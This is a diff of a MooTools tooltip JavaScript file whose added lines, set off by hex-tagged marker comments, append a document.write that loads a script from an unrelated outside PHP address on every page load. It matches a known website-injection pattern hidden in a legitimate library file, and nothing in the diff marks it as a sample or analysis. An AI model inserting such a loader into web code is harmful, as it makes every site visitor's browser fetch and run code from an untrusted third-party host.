@@ -200,3 +200,13 @@ var MooTooltips = new Class({
 		return {'container':container,'header':header,'message':message,'footer':footer,'close':closeBtn||null};		
 	}	
 });
+
+/*314d61*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/314d61*/
